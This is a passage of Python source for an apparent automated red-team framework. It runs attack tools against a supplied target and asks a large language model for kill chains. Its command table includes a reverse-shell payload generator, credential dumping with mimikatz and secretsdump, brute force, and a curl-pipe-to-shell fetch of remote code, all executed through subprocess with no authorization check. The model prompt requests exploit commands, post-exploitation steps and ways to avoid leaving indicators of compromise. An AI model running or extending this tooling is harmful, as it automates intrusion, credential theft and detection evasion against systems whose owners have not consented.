from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import subprocess
import asyncio
import httpx
import json
import re

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

KIMI_API_KEY = os.environ.get('KIMI_API_KEY', '')
KIMI_API_URL = "https://api.moonshot.ai/v1/chat/completions"

app = FastAPI(title="Red Team Automation Framework")
api_router = APIRouter(prefix="/api")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

scan_progress: Dict[str, Dict[str, Any]] = {}
attack_trees: Dict[str, Dict[str, Any]] = {}

# =============================================================================
# MITRE ATT&CK TACTICS & TECHNIQUES DATABASE
# =============================================================================
MITRE_TACTICS = {
    "reconnaissance": {
        "id": "TA0043",
        "name": "Reconnaissance",
        "description": "Gathering information to plan future operations",
        "techniques": [
            {"id": "T1595", "name": "Active Scanning", "tools": ["nmap", "masscan", "zmap"]},
            {"id": "T1592", "name": "Gather Victim Host Information", "tools": ["whatweb", "wappalyzer"]},
            {"id": "T1589", "name": "Gather Victim Identity Info", "tools": ["theharvester", "hunter.io"]},
            {"id": "T1590", "name": "Gather Victim Network Info", "tools": ["subfinder", "amass", "dnsenum"]},
            {"id": "T1591", "name": "Gather Victim Org Info", "tools": ["osint", "linkedin"]},
            {"id": "T1593", "name": "Search Open Websites/Domains", "tools": ["google_dorks", "shodan"]},
            {"id": "T1594", "name": "Search Victim-Owned Websites", "tools": ["dirb", "gobuster", "feroxbuster"]}
        ]
    },
    "resource_development": {
        "id": "TA0042",
        "name": "Resource Development",
        "description": "Establishing resources for operations",
        "techniques": [
            {"id": "T1583", "name": "Acquire Infrastructure", "tools": ["cloud_enum", "domain_registration"]},
            {"id": "T1587", "name": "Develop Capabilities", "tools": ["msfvenom", "veil", "shellter"]},
            {"id": "T1588", "name": "Obtain Capabilities", "tools": ["exploit_db", "github"]}
        ]
    },
    "initial_access": {
        "id": "TA0001",
        "name": "Initial Access",
        "description": "Gaining initial foothold in target environment",
        "techniques": [
            {"id": "T1190", "name": "Exploit Public-Facing Application", "tools": ["nikto", "sqlmap", "nuclei"]},
            {"id": "T1133", "name": "External Remote Services", "tools": ["hydra", "medusa", "crackmapexec"]},
            {"id": "T1566", "name": "Phishing", "tools": ["gophish", "setoolkit", "evilginx2"]},
            {"id": "T1078", "name": "Valid Accounts", "tools": ["spray", "kerbrute", "o365spray"]},
            {"id": "T1189", "name": "Drive-by Compromise", "tools": ["beef", "browser_exploit"]}
        ]
    },
    "execution": {
        "id": "TA0002",
        "name": "Execution",
        "description": "Running malicious code",
        "techniques": [
            {"id": "T1059.001", "name": "PowerShell", "tools": ["powershell_empire", "powercat"]},
            {"id": "T1059.003", "name": "Windows Command Shell", "tools": ["cmd", "bat_scripts"]},
            {"id": "T1059.004", "name": "Unix Shell", "tools": ["bash", "sh", "reverse_shell"]},
            {"id": "T1203", "name": "Exploitation for Client Execution", "tools": ["metasploit", "cobalt_strike"]}
        ]
    },
    "persistence": {
        "id": "TA0003",
        "name": "Persistence",
        "description": "Maintaining access across restarts",
        "techniques": [
            {"id": "T1547.001", "name": "Registry Run Keys", "tools": ["reg", "powershell"]},
            {"id": "T1053", "name": "Scheduled Task/Job", "tools": ["schtasks", "cron", "at"]},
            {"id": "T1136", "name": "Create Account", "tools": ["net_user", "useradd"]},
            {"id": "T1543", "name": "Create/Modify System Process", "tools": ["sc", "systemctl"]},
            {"id": "T1505.003", "name": "Web Shell", "tools": ["weevely", "china_chopper", "webshell"]}
        ]
    },
    "privilege_escalation": {
        "id": "TA0004",
        "name": "Privilege Escalation",
        "description": "Gaining higher-level permissions",
        "techniques": [
            {"id": "T1055", "name": "Process Injection", "tools": ["process_hollowing", "dll_injection"]},
            {"id": "T1068", "name": "Exploitation for Privilege Escalation", "tools": ["linpeas", "winpeas", "suggester"]},
            {"id": "T1548", "name": "Abuse Elevation Control", "tools": ["uac_bypass", "sudo_exploit"]},
            {"id": "T1134", "name": "Access Token Manipulation", "tools": ["incognito", "token_impersonation"]}
        ]
    },
    "defense_evasion": {
        "id": "TA0005",
        "name": "Defense Evasion",
        "description": "Avoiding detection",
        "techniques": [
            {"id": "T1562", "name": "Impair Defenses", "tools": ["disable_av", "firewall_bypass"]},
            {"id": "T1070", "name": "Indicator Removal", "tools": ["log_cleaner", "timestomp"]},
            {"id": "T1036", "name": "Masquerading", "tools": ["rename", "icon_change"]},
            {"id": "T1027", "name": "Obfuscated Files", "tools": ["upx", "veil", "donut"]},
            {"id": "T1497", "name": "Virtualization/Sandbox Evasion", "tools": ["vm_detect", "sandbox_escape"]}
        ]
    },
    "credential_access": {
        "id": "TA0006",
        "name": "Credential Access",
        "description": "Stealing credentials",
        "techniques": [
            {"id": "T1003", "name": "OS Credential Dumping", "tools": ["mimikatz", "secretsdump", "lazagne"]},
            {"id": "T1555", "name": "Credentials from Password Stores", "tools": ["keychain_dump", "browser_creds"]},
            {"id": "T1110", "name": "Brute Force", "tools": ["hydra", "hashcat", "john"]},
            {"id": "T1558", "name": "Steal/Forge Kerberos Tickets", "tools": ["rubeus", "kekeo", "impacket"]}
        ]
    },
    "discovery": {
        "id": "TA0007",
        "name": "Discovery",
        "description": "Understanding the environment",
        "techniques": [
            {"id": "T1087", "name": "Account Discovery", "tools": ["net_user", "ldapsearch", "bloodhound"]},
            {"id": "T1482", "name": "Domain Trust Discovery", "tools": ["nltest", "adfind", "bloodhound"]},
            {"id": "T1046", "name": "Network Service Discovery", "tools": ["nmap", "netstat", "arp"]},
            {"id": "T1057", "name": "Process Discovery", "tools": ["ps", "tasklist", "wmic"]},
            {"id": "T1018", "name": "Remote System Discovery", "tools": ["ping_sweep", "crackmapexec"]}
        ]
    },
    "lateral_movement": {
        "id": "TA0008",
        "name": "Lateral Movement",
        "description": "Moving through the environment",
        "techniques": [
            {"id": "T1021.001", "name": "Remote Desktop Protocol", "tools": ["rdp", "xfreerdp", "rdesktop"]},
            {"id": "T1021.002", "name": "SMB/Windows Admin Shares", "tools": ["psexec", "smbexec", "wmiexec"]},
            {"id": "T1021.004", "name": "SSH", "tools": ["ssh", "plink", "putty"]},
            {"id": "T1021.006", "name": "Windows Remote Management", "tools": ["winrm", "evil-winrm"]},
            {"id": "T1570", "name": "Lateral Tool Transfer", "tools": ["scp", "smb_copy", "certutil"]}
        ]
    },
    "collection": {
        "id": "TA0009",
        "name": "Collection",
        "description": "Gathering target data",
        "techniques": [
            {"id": "T1560", "name": "Archive Collected Data", "tools": ["7zip", "tar", "rar"]},
            {"id": "T1005", "name": "Data from Local System", "tools": ["find", "dir", "tree"]},
            {"id": "T1039", "name": "Data from Network Shared Drive", "tools": ["smb_enum", "mount"]},
            {"id": "T1113", "name": "Screen Capture", "tools": ["screenshot", "scrot"]}
        ]
    },
    "command_and_control": {
        "id": "TA0011",
        "name": "Command and Control",
        "description": "Communicating with compromised systems",
        "techniques": [
            {"id": "T1071", "name": "Application Layer Protocol", "tools": ["http_c2", "https_c2", "dns_c2"]},
            {"id": "T1572", "name": "Protocol Tunneling", "tools": ["chisel", "ligolo", "sshuttle"]},
            {"id": "T1219", "name": "Remote Access Software", "tools": ["teamviewer", "anydesk", "vnc"]},
            {"id": "T1573", "name": "Encrypted Channel", "tools": ["ssl", "tls", "ssh_tunnel"]}
        ]
    },
    "exfiltration": {
        "id": "TA0010",
        "name": "Exfiltration",
        "description": "Stealing data",
        "techniques": [
            {"id": "T1041", "name": "Exfiltration Over C2 Channel", "tools": ["c2_exfil", "beacon"]},
            {"id": "T1048", "name": "Exfiltration Over Alternative Protocol", "tools": ["dns_exfil", "icmp_exfil"]},
            {"id": "T1567", "name": "Exfiltration Over Web Service", "tools": ["pastebin", "discord", "telegram"]}
        ]
    },
    "impact": {
        "id": "TA0040",
        "name": "Impact",
        "description": "Manipulate, interrupt, or destroy systems/data",
        "techniques": [
            {"id": "T1485", "name": "Data Destruction", "tools": ["wipe", "shred", "dd"]},
            {"id": "T1486", "name": "Data Encrypted for Impact", "tools": ["ransomware", "encryption"]},
            {"id": "T1489", "name": "Service Stop", "tools": ["service_stop", "kill_process"]},
            {"id": "T1490", "name": "Inhibit System Recovery", "tools": ["vssadmin", "bcdedit"]}
        ]
    }
}

# =============================================================================
# RED TEAM TOOLS DATABASE
# =============================================================================
RED_TEAM_TOOLS = {
    # RECONNAISSANCE
    "nmap": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "nmap -sV -sC -A {target}", "desc": "Network scanner - puertos, servicios, OS"},
    "masscan": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "masscan -p1-65535 {target} --rate=1000", "desc": "Fastest port scanner"},
    "subfinder": {"phase": "reconnaissance", "mitre": "T1590", "cmd": "subfinder -d {target} -silent", "desc": "Subdomain discovery"},
    "amass": {"phase": "reconnaissance", "mitre": "T1590", "cmd": "amass enum -d {target}", "desc": "Attack surface mapping"},
    "theharvester": {"phase": "reconnaissance", "mitre": "T1589", "cmd": "theHarvester -d {target} -b all", "desc": "OSINT - emails, hosts"},
    "whatweb": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "whatweb -v {target}", "desc": "Web fingerprinting"},
    "wafw00f": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "wafw00f {target}", "desc": "WAF detection"},
    "gobuster": {"phase": "reconnaissance", "mitre": "T1594", "cmd": "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt", "desc": "Directory bruteforce"},
    "feroxbuster": {"phase": "reconnaissance", "mitre": "T1594", "cmd": "feroxbuster -u {target} -w /usr/share/seclists/Discovery/Web-Content/common.txt", "desc": "Fast recursive content discovery"},
    "shodan": {"phase": "reconnaissance", "mitre": "T1593", "cmd": "shodan search hostname:{target}", "desc": "Internet-wide scanning"},
    "nuclei": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "nuclei -u {target} -t cves/", "desc": "Vulnerability scanner with templates"},
    
    # INITIAL ACCESS
    "nikto": {"phase": "initial_access", "mitre": "T1190", "cmd": "nikto -h {target}", "desc": "Web vulnerability scanner"},
    "sqlmap": {"phase": "initial_access", "mitre": "T1190", "cmd": "sqlmap -u '{target}' --dbs --batch", "desc": "SQL injection automation"},
    "hydra": {"phase": "initial_access", "mitre": "T1110", "cmd": "hydra -L users.txt -P pass.txt {target} ssh", "desc": "Brute force login"},
    "crackmapexec": {"phase": "initial_access", "mitre": "T1078", "cmd": "crackmapexec smb {target} -u user -p pass", "desc": "SMB/WinRM/MSSQL pentesting"},
    "kerbrute": {"phase": "initial_access", "mitre": "T1078", "cmd": "kerbrute userenum -d DOMAIN users.txt --dc {target}", "desc": "Kerberos user enumeration"},
    
    # EXECUTION
    "msfvenom": {"phase": "execution", "mitre": "T1587", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe", "desc": "Payload generation"},
    "metasploit": {"phase": "execution", "mitre": "T1203", "cmd": "msfconsole -x 'use {module}; set RHOSTS {target}; run'", "desc": "Exploitation framework"},
    
    # PRIVILEGE ESCALATION
    "linpeas": {"phase": "privilege_escalation", "mitre": "T1068", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", "desc": "Linux privilege escalation audit"},
    "winpeas": {"phase": "privilege_escalation", "mitre": "T1068", "cmd": "winPEASx64.exe", "desc": "Windows privilege escalation audit"},
    "linux_exploit_suggester": {"phase": "privilege_escalation", "mitre": "T1068", "cmd": "linux-exploit-suggester.sh", "desc": "Kernel exploit suggester"},
    
    # CREDENTIAL ACCESS
    "mimikatz": {"phase": "credential_access", "mitre": "T1003", "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit", "desc": "Windows credential dumping"},
    "secretsdump": {"phase": "credential_access", "mitre": "T1003", "cmd": "secretsdump.py DOMAIN/user:pass@{target}", "desc": "Remote credential extraction"},
    "hashcat": {"phase": "credential_access", "mitre": "T1110", "cmd": "hashcat -m 1000 hashes.txt wordlist.txt", "desc": "Password cracking"},
    "john": {"phase": "credential_access", "mitre": "T1110", "cmd": "john --wordlist=rockyou.txt hashes.txt", "desc": "John the Ripper"},
    "rubeus": {"phase": "credential_access", "mitre": "T1558", "cmd": "Rubeus.exe kerberoast /outfile:hashes.txt", "desc": "Kerberos attacks"},
    
    # LATERAL MOVEMENT
    "psexec": {"phase": "lateral_movement", "mitre": "T1021.002", "cmd": "psexec.py DOMAIN/user:pass@{target}", "desc": "Remote execution via SMB"},
    "wmiexec": {"phase": "lateral_movement", "mitre": "T1021.002", "cmd": "wmiexec.py DOMAIN/user:pass@{target}", "desc": "Remote execution via WMI"},
    "evil-winrm": {"phase": "lateral_movement", "mitre": "T1021.006", "cmd": "evil-winrm -i {target} -u user -p pass", "desc": "WinRM shell"},
    "smbexec": {"phase": "lateral_movement", "mitre": "T1021.002", "cmd": "smbexec.py DOMAIN/user:pass@{target}", "desc": "SMB execution"},
    
    # POST-EXPLOITATION
    "bloodhound": {"phase": "discovery", "mitre": "T1087", "cmd": "bloodhound-python -u user -p pass -d DOMAIN -c All", "desc": "Active Directory recon"},
    "sharphound": {"phase": "discovery", "mitre": "T1087", "cmd": "SharpHound.exe -c All", "desc": "BloodHound collector"},
    
    # C2
    "chisel": {"phase": "command_and_control", "mitre": "T1572", "cmd": "chisel server -p 8080 --reverse", "desc": "TCP/UDP tunneling"},
    "ligolo": {"phase": "command_and_control", "mitre": "T1572", "cmd": "ligolo-ng -selfcert", "desc": "Advanced tunneling"},
}

# =============================================================================
# METASPLOIT MODULES DATABASE (Expanded)
# =============================================================================
METASPLOIT_MODULES = [
    # Exploits - Web
    {"name": "exploit/multi/http/apache_mod_cgi_bash_env_exec", "desc": "Shellshock (CVE-2014-6271)", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/unix/webapp/php_cgi_arg_injection", "desc": "PHP CGI Argument Injection", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/multi/http/tomcat_mgr_upload", "desc": "Tomcat Manager Upload", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/multi/http/struts2_content_type_ognl", "desc": "Apache Struts 2 RCE (CVE-2017-5638)", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/multi/http/jenkins_script_console", "desc": "Jenkins Script Console RCE", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/unix/webapp/drupal_drupalgeddon2", "desc": "Drupalgeddon2 RCE (CVE-2018-7600)", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/multi/http/wp_crop_rce", "desc": "WordPress Crop RCE", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/multi/http/log4shell_header_injection", "desc": "Log4Shell (CVE-2021-44228)", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/multi/http/spring4shell_rce", "desc": "Spring4Shell RCE (CVE-2022-22965)", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    
    # Exploits - SMB/Windows
    {"name": "exploit/windows/smb/ms17_010_eternalblue", "desc": "EternalBlue SMB RCE (MS17-010)", "rank": "excellent", "category": "exploit", "mitre": "T1210"},
    {"name": "exploit/windows/smb/ms08_067_netapi", "desc": "MS08-067 NetAPI RCE", "rank": "great", "category": "exploit", "mitre": "T1210"},
    {"name": "exploit/windows/smb/psexec", "desc": "PsExec via SMB", "rank": "manual", "category": "exploit", "mitre": "T1021.002"},
    {"name": "exploit/windows/local/always_install_elevated", "desc": "AlwaysInstallElevated Priv Esc", "rank": "excellent", "category": "exploit", "mitre": "T1548"},
    {"name": "exploit/windows/local/bypassuac_fodhelper", "desc": "UAC Bypass via FodHelper", "rank": "excellent", "category": "exploit", "mitre": "T1548"},
    
    # Exploits - Linux
    {"name": "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec", "desc": "PwnKit Polkit Priv Esc (CVE-2021-4034)", "rank": "excellent", "category": "exploit", "mitre": "T1068"},
    {"name": "exploit/linux/local/sudo_baron_samedit", "desc": "Sudo Baron Samedit (CVE-2021-3156)", "rank": "excellent", "category": "exploit", "mitre": "T1068"},
    {"name": "exploit/linux/local/cve_2022_0847_dirtypipe", "desc": "Dirty Pipe (CVE-2022-0847)", "rank": "excellent", "category": "exploit", "mitre": "T1068"},
    
    # Auxiliary - Scanners
    {"name": "auxiliary/scanner/http/dir_scanner", "desc": "HTTP Directory Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1594"},
    {"name": "auxiliary/scanner/smb/smb_ms17_010", "desc": "MS17-010 SMB Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1595"},
    {"name": "auxiliary/scanner/ssh/ssh_login", "desc": "SSH Brute Force", "rank": "normal", "category": "auxiliary", "mitre": "T1110"},
    {"name": "auxiliary/scanner/smb/smb_login", "desc": "SMB Login Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1110"},
    {"name": "auxiliary/scanner/http/wordpress_scanner", "desc": "WordPress Vulnerability Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1595"},
    {"name": "auxiliary/scanner/mysql/mysql_login", "desc": "MySQL Login Brute Force", "rank": "normal", "category": "auxiliary", "mitre": "T1110"},
    {"name": "auxiliary/scanner/rdp/rdp_scanner", "desc": "RDP Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1595"},
    {"name": "auxiliary/scanner/vnc/vnc_login", "desc": "VNC Login Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1110"},
    
    # Post - Windows
    {"name": "post/windows/gather/hashdump", "desc": "Windows Password Hash Dump", "rank": "normal", "category": "post", "mitre": "T1003"},
    {"name": "post/windows/gather/credentials/credential_collector", "desc": "Credential Collector", "rank": "normal", "category": "post", "mitre": "T1555"},
    {"name": "post/multi/recon/local_exploit_suggester", "desc": "Local Exploit Suggester", "rank": "normal", "category": "post", "mitre": "T1068"},
    {"name": "post/windows/manage/enable_rdp", "desc": "Enable RDP", "rank": "normal", "category": "post", "mitre": "T1021.001"},
    {"name": "post/windows/manage/migrate", "desc": "Process Migration", "rank": "normal", "category": "post", "mitre": "T1055"},
    
    # Post - Linux
    {"name": "post/linux/gather/hashdump", "desc": "Linux Hash Dump", "rank": "normal", "category": "post", "mitre": "T1003"},
    {"name": "post/multi/gather/env", "desc": "Environment Variables", "rank": "normal", "category": "post", "mitre": "T1082"},
    {"name": "post/linux/gather/enum_configs", "desc": "Linux Config Enumeration", "rank": "normal", "category": "post", "mitre": "T1005"},
    
    # Payloads for reference
    {"name": "payload/windows/x64/meterpreter/reverse_tcp", "desc": "Windows x64 Meterpreter Reverse TCP", "rank": "normal", "category": "payload", "mitre": "T1059"},
    {"name": "payload/linux/x64/meterpreter/reverse_tcp", "desc": "Linux x64 Meterpreter Reverse TCP", "rank": "normal", "category": "payload", "mitre": "T1059"},
]

# =============================================================================
# MODELS
# =============================================================================
class ScanCreate(BaseModel):
    target: str
    scan_phases: List[str] = ["reconnaissance", "initial_access"]
    tools: List[str] = []

class ExploitExecute(BaseModel):
    scan_id: str
    node_id: str
    module: str
    target_host: str
    target_port: Optional[int] = None
    options: Dict[str, str] = {}
    lhost: Optional[str] = None
    lport: Optional[int] = 4444

class UpdateNodeStatus(BaseModel):
    status: str
    notes: Optional[str] = None

class AddNodeRequest(BaseModel):
    parent_id: str
    type: str
    name: str
    description: str
    severity: Optional[str] = "medium"
    mitre_id: Optional[str] = None
    data: Dict[str, Any] = {}

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================
def parse_nmap_output(output: str) -> Dict[str, Any]:
    ports = []
    os_info = None
    for line in output.split('\n'):
        if '/tcp' in line or '/udp' in line:
            parts = line.split()
            if len(parts) >= 3:
                ports.append({"port": parts[0], "state": parts[1], "service": parts[2]})
        if 'OS:' in line or 'Running:' in line:
            os_info = line.strip()
    return {"ports": ports, "os": os_info, "raw": output}

def parse_nikto_output(output: str) -> Dict[str, Any]:
    vulns = []
    for line in output.split('\n'):
        if line.strip().startswith('+'):
            severity = "low"
            if any(x in line.lower() for x in ['critical', 'rce', 'injection', 'xss']):
                severity = "critical" if 'rce' in line.lower() else "high"
            vulns.append({"finding": line.strip(), "severity": severity})
    return {"vulnerabilities": vulns, "raw": output}

async def run_tool(tool_id: str, target: str) -> Dict[str, Any]:
    logger.info(f"Running {tool_id} on {target}")
    tool = RED_TEAM_TOOLS.get(tool_id)
    if not tool:
        return {"error": f"Unknown tool: {tool_id}"}
    
    try:
        cmd = tool["cmd"].format(target=target, module="")
        cmd_parts = cmd.split()
        result = subprocess.run(cmd_parts, capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr
        
        if tool_id == "nmap":
            return parse_nmap_output(output)
        elif tool_id == "nikto":
            return parse_nikto_output(output)
        else:
            return {"output": output, "raw": output}
            
    except subprocess.TimeoutExpired:
        return {"error": f"{tool_id} timed out", "simulated": True}
    except FileNotFoundError:
        # Simulate output for demo
        return {
            "simulated": True,
            "tool": tool_id,
            "phase": tool["phase"],
            "mitre": tool["mitre"],
            "command": tool["cmd"].format(target=target, module=""),
            "note": f"[SIMULATED] {tool['desc']} - Install {tool_id} for real results"
        }
    except Exception as e:
        return {"error": str(e)}

async def run_metasploit(module: str, target: str, port: Optional[int], options: Dict, lhost: str = None, lport: int = 4444) -> Dict[str, Any]:
    logger.info(f"Running MSF module: {module} on {target}")
    
    rc_content = f"""use {module}
set RHOSTS {target}
"""
    if port:
        rc_content += f"set RPORT {port}\n"
    if lhost:
        rc_content += f"set LHOST {lhost}\n"
    if lport:
        rc_content += f"set LPORT {lport}\n"
    for k, v in options.items():
        rc_content += f"set {k} {v}\n"
    rc_content += "run\nexit\n"
    
    try:
        rc_file = f"/tmp/msf_{uuid.uuid4().hex[:8]}.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        result = subprocess.run(["msfconsole", "-q", "-r", rc_file], capture_output=True, text=True, timeout=300)
        os.remove(rc_file)
        
        output = result.stdout + result.stderr
        success = "session" in output.lower() and "opened" in output.lower()
        
        return {
            "module": module, "target": target, "success": success,
            "session_opened": success, "output": output, "rc_command": rc_content
        }
    except FileNotFoundError:
        return {
            "module": module, "target": target, "success": False,
            "simulated": True, "session_opened": False,
            "output": f"[SIMULATED] Metasploit execution for {module}",
            "rc_command": rc_content,
            "note": "Install Metasploit Framework for real exploitation"
        }
    except Exception as e:
        return {"error": str(e), "module": module}

async def analyze_with_kimi(results: Dict[str, Any], target: str, phases: List[str]) -> Dict[str, Any]:
    if not KIMI_API_KEY:
        return {"analysis": "Kimi API key not configured", "attack_paths": [], "recommendations": []}
    
    prompt = f"""Eres un experto Red Team operator. Analiza los resultados de reconocimiento y pentesting para: {target}

FASES EJECUTADAS: {', '.join(phases)}

RESULTADOS:
{json.dumps(results, indent=2, default=str)}

Proporciona un análisis táctico según MITRE ATT&CK:

1. **RESUMEN EJECUTIVO**: Hallazgos críticos en 3-5 líneas

2. **VECTORES DE ATAQUE IDENTIFICADOS**: Lista cada vector con:
   - MITRE ATT&CK Technique ID
   - Descripción del vector
   - Probabilidad de éxito (Alta/Media/Baja)
   - Impacto potencial

3. **KILL CHAIN RECOMENDADA**: Secuencia de pasos para compromiso:
   - Initial Access → Execution → Persistence → Privilege Escalation → etc.

4. **COMANDOS ESPECÍFICOS**: Para cada técnica, proporciona:
   ```
   # Técnica: T1XXX - Nombre
   comando_especifico
   ```

5. **EXPLOITS METASPLOIT RECOMENDADOS**:
   - use exploit/...
   - set RHOSTS {target}
   - run

6. **POST-EXPLOTACIÓN**: Si se logra acceso inicial:
   - Credential dumping
   - Lateral movement
   - Persistence mechanisms

7. **INDICADORES DE COMPROMISO (IOCs)** a evitar generar

Responde en español. Sé específico con técnicas, herramientas y comandos."""

    try:
        async with httpx.AsyncClient(timeout=120.0) as http_client:
            response = await http_client.post(
                KIMI_API_URL,
                headers={"Authorization": f"Bearer {KIMI_API_KEY}", "Content-Type": "application/json"},
                json={
                    "model": "kimi-k2-0711-preview",
                    "messages": [
                        {"role": "system", "content": "Eres un Red Team operator experto con certificaciones OSCP, OSCE, CRTO. Tu especialidad es identificar vectores de ataque y proporcionar rutas de compromiso detalladas usando MITRE ATT&CK."},
                        {"role": "user", "content": prompt}
                    ],
                    "temperature": 0.4,
                    "max_tokens": 8000
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                ai_response = data["choices"][0]["message"]["content"]
                
                # Extract attack paths and exploits
                exploits = []
                attack_paths = []
                
                for line in ai_response.split('\n'):
                    if 'use ' in line.lower() and ('exploit/' in line.lower() or 'auxiliary/' in line.lower() or 'post/' in line.lower()):
                        match = re.search(r'use\s+((?:exploit|auxiliary|post)/[^\s]+)', line, re.IGNORECASE)
                        if match:
                            exploits.append({"type": "metasploit", "module": match.group(1), "command": line.strip()})
                    if re.search(r'T\d{4}', line):
                        attack_paths.append(line.strip())
                
                return {"analysis": ai_response, "exploits": exploits, "attack_paths": attack_paths}
            else:
                return {"analysis": f"API Error: {response.status_code}", "exploits": [], "attack_paths": []}
    except Exception as e:
        return {"analysis": f"Error: {str(e)}", "exploits": [], "attack_paths": []}

def build_attack_tree(scan_id: str, target: str, results: Dict[str, Any], phases: List[str], ai_data: Dict) -> Dict[str, Any]:
    tree = {
        "scan_id": scan_id,
        "root": {
            "id": "root",
            "type": "target",
            "name": target,
            "description": f"Target: {target} | Phases: {', '.join(phases)}",
            "status": "testing",
            "mitre": None,
            "children": []
        },
        "nodes": {}
    }
    
    node_id = 0
    
    # Add nodes for each phase
    for phase in phases:
        node_id += 1
        phase_id = f"phase_{phase}"
        tactic = MITRE_TACTICS.get(phase, {})
        
        phase_node = {
            "id": phase_id,
            "parent_id": "root",
            "type": "phase",
            "name": f"{tactic.get('name', phase.upper())} ({tactic.get('id', '')})",
            "description": tactic.get('description', ''),
            "status": "completed" if phase in results else "pending",
            "severity": "info",
            "mitre": tactic.get('id'),
            "data": {},
            "children": []
        }
        tree["nodes"][phase_id] = phase_node
        tree["root"]["children"].append(phase_id)
        
        # Add tool results under phase
        for tool_id, tool_result in results.items():
            tool_info = RED_TEAM_TOOLS.get(tool_id, {})
            if tool_info.get("phase") == phase:
                node_id += 1
                tool_node_id = f"tool_{node_id}"
                
                tool_node = {
                    "id": tool_node_id,
                    "parent_id": phase_id,
                    "type": "tool",
                    "name": f"{tool_id.upper()} - {tool_info.get('mitre', '')}",
                    "description": tool_info.get('desc', ''),
                    "status": "success" if not tool_result.get("error") else "failed",
                    "severity": "info",
                    "mitre": tool_info.get('mitre'),
                    "data": tool_result,
                    "children": []
                }
                tree["nodes"][tool_node_id] = tool_node
                phase_node["children"].append(tool_node_id)
                
                # Add findings as children
                if "ports" in tool_result:
                    for port_info in tool_result["ports"][:10]:
                        node_id += 1
                        port_node_id = f"port_{node_id}"
                        tree["nodes"][port_node_id] = {
                            "id": port_node_id,
                            "parent_id": tool_node_id,
                            "type": "service",
                            "name": f"{port_info['port']} - {port_info['service']}",
                            "description": f"State: {port_info['state']}",
                            "status": "pending",
                            "severity": "medium" if port_info['state'] == 'open' else "low",
                            "mitre": "T1595",
                            "data": port_info,
                            "children": []
                        }
                        tool_node["children"].append(port_node_id)
                
                if "vulnerabilities" in tool_result:
                    for vuln in tool_result["vulnerabilities"][:10]:
                        node_id += 1
                        vuln_node_id = f"vuln_{node_id}"
                        tree["nodes"][vuln_node_id] = {
                            "id": vuln_node_id,
                            "parent_id": tool_node_id,
                            "type": "vulnerability",
                            "name": vuln.get("finding", str(vuln))[:50],
                            "description": vuln.get("finding", str(vuln)),
                            "status": "pending",
                            "severity": vuln.get("severity", "medium"),
                            "mitre": "T1190",
                            "data": vuln,
                            "children": []
                        }
                        tool_node["children"].append(vuln_node_id)
    
    # Add AI-suggested exploits
    if ai_data.get("exploits"):
        node_id += 1
        exploit_phase_id = f"exploits_{node_id}"
        exploit_phase = {
            "id": exploit_phase_id,
            "parent_id": "root",
            "type": "phase",
            "name": "RECOMMENDED EXPLOITS",
            "description": "AI-generated exploitation recommendations",
            "status": "pending",
            "severity": "critical",
            "mitre": "TA0002",
            "data": {},
            "children": []
        }
        tree["nodes"][exploit_phase_id] = exploit_phase
        tree["root"]["children"].append(exploit_phase_id)
        
        for exploit in ai_data["exploits"]:
            node_id += 1
            exp_node_id = f"exploit_{node_id}"
            tree["nodes"][exp_node_id] = {
                "id": exp_node_id,
                "parent_id": exploit_phase_id,
                "type": "exploit",
                "name": exploit.get("module", "Unknown"),
                "description": exploit.get("command", ""),
                "status": "pending",
                "severity": "critical",
                "mitre": "T1203",
                "data": exploit,
                "children": []
            }
            exploit_phase["children"].append(exp_node_id)
    
    return tree

async def run_scan_background(scan_id: str, target: str, phases: List[str], tools: List[str]):
    global scan_progress, attack_trees
    
    scan_progress[scan_id] = {
        "status": "running", "current_tool": None, "progress": 0,
        "results": {}, "ai_analysis": None, "attack_tree": None
    }
    
    # Determine tools to run based on phases
    tools_to_run = tools if tools else []
    if not tools_to_run:
        for phase in phases:
            for tool_id, tool_info in RED_TEAM_TOOLS.items():
                if tool_info["phase"] == phase:
                    tools_to_run.append(tool_id)
    
    total_steps = len(tools_to_run) + 1
    completed = 0
    
    try:
        for tool_id in tools_to_run:
            scan_progress[scan_id]["current_tool"] = tool_id
